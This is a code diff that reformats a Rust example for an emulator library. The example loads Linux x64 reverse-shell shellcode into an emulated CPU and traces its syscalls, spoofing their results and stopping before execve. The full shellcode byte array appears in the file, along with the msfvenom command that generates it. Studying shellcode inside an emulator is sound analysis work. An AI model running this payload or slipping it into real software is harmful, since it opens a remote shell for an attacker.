@@ -16,8 +16,8 @@
 
 use rusty_box::{
     cpu::{
-        core_i7_skylake::Corei7SkylakeX,
-        CpuSetupMode, HookCtx, HookMask, InstrAction, Instrumentation, ResetReason, X86Reg,
+        core_i7_skylake::Corei7SkylakeX, CpuSetupMode, HookCtx, HookMask, InstrAction,
+        Instrumentation, ResetReason, X86Reg,
     },
     emulator::{Emulator, EmulatorConfig},
 };
@@ -25,12 +25,11 @@ use rusty_box::{
 /// `msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw`
 /// socket → connect → dup2 ×3 → execve("/bin/sh", ...).
 static SHELLCODE: &[u8] = &[
-    0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97,
-    0x48, 0xb9, 0x02, 0x00, 0x11, 0x5c, 0x7f, 0x00, 0x00, 0x01, 0x51, 0x48, 0x89, 0xe6,
-    0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce,
-    0x6a, 0x21, 0x58, 0x0f, 0x05, 0x75, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f,
-    0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48,
-    0x89, 0xe6, 0x0f, 0x05,
+    0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, 0xb9,
+    0x02, 0x00, 0x11, 0x5c, 0x7f, 0x00, 0x00, 0x01, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a,
+    0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x75,
+    0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53,
+    0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,
 ];
 
 const SHELLCODE_BASE: u64 = 0x0040_0000;
@@ -44,7 +43,9 @@ pub struct Tracer {
 }
 
 impl Instrumentation for Tracer {
-    fn active_hooks(&self) -> HookMask { HookMask::empty() }
+    fn active_hooks(&self) -> HookMask {
+        HookMask::empty()
+    }
 
     fn pre_syscall(&mut self, ctx: &mut HookCtx) -> InstrAction {
         self.syscalls += 1;
@@ -55,14 +56,15 @@ impl Instrumentation for Tracer {
 
         // Spoof a return value and decide whether to stop.
         let (retval, stop) = match nr {
-            41 => { // socket — hand back a fake fd
+            41 => {
+                // socket — hand back a fake fd
                 let fd = self.next_fd;
                 self.next_fd += 1;
                 (fd, false)
             }
-            33 => (a1, false),       // dup2 → newfd
-            59 => (0, true),         // execve → would exec, stop here
-            _ => (0, false),         // everything else → success
+            33 => (a1, false), // dup2 → newfd
+            59 => (0, true),   // execve → would exec, stop here
+            _ => (0, false),   // everything else → success
         };
 
         tracing::info!(
@@ -72,7 +74,11 @@ impl Instrumentation for Tracer {
         );
 
         ctx.reg_write(X86Reg::Rax, retval);
-        if stop { InstrAction::SkipAndStop } else { InstrAction::Skip }
+        if stop {
+            InstrAction::SkipAndStop
+        } else {
+            InstrAction::Skip
+        }
     }
 }
 
@@ -99,9 +105,17 @@ fn run() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
         pci_enabled: false,
         ..EmulatorConfig::default()
     };
-    let tracer = Tracer { next_fd: 3, ..Default::default() };
-    let mut emu = Emulator::<Corei7SkylakeX, Tracer>::new_with_instrumentation(cfg.clone(), tracer)?;
-    emu.memory.init_memory(cfg.guest_memory_size, cfg.host_memory_size, cfg.memory_block_size)?;
+    let tracer = Tracer {
+        next_fd: 3,
+        ..Default::default()
+    };
+    let mut emu =
+        Emulator::<Corei7SkylakeX, Tracer>::new_with_instrumentation(cfg.clone(), tracer)?;
+    emu.memory.init_memory(
+        cfg.guest_memory_size,
+        cfg.host_memory_size,
+        cfg.memory_block_size,
+    )?;
     emu.memory.set_a20_mask(emu.pc_system.a20_mask());
     emu.pc_system.initialize(cfg.ips);
     emu.cpu.reset(ResetReason::Hardware);
@@ -112,6 +126,9 @@ fn run() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
 
     tracing::info!("Loaded {} bytes at {SHELLCODE_BASE:#x}", SHELLCODE.len());
     let reason = emu.emu_start(SHELLCODE_BASE, None, None, Some(10_000))?;
-    tracing::info!("Stopped: {reason:?}, {} syscalls intercepted", emu.instrumentation().syscalls);
+    tracing::info!(
+        "Stopped: {reason:?}, {} syscalls intercepted",
+        emu.instrumentation().syscalls
+    );
     Ok(())
 }
